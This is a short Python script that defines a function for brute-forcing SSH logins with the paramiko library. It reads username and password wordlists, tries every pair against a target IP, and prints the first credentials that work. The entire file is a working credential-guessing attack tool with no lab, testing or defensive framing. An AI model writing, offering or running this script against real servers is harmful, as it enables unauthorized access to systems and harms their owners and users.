import paramiko
import socket

def brute_force_ssh(target_ip, username_list_path, password_list_path):
    """Attempts to brute-force SSH login."""

    try:
        with open(username_list_path, 'r') as user_file:
            usernames = user_file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: Username list file not found: {username_list_path}")
        return False

    try:
        with open(password_list_path, 'r') as pass_file:
            passwords = pass_file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: Password list file not found: {password_list_path}")
        return False

    for username in usernames:
        for password in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Auto-add host key (INSECURE for production!)
                ssh.connect(target_ip, username=username, password=password, timeout=3)
                print(f"Success: Username='{username}', Password='{password}'")
                ssh.close()
                return True  # Exit on first successful login
            except paramiko.AuthenticationException:
                pass  # Incorrect credentials
            except paramiko.ssh_exception.SSHException:
                print("SSH connection error.")
                return False
            except socket.error as e:
                print(f"Socket error while connecting to SSH: {e}")
                return False
            except Exception as e:
                print(f"An unexpected error occurred: {e}")
                return False
    print("Failed to find valid credentials.")
    return False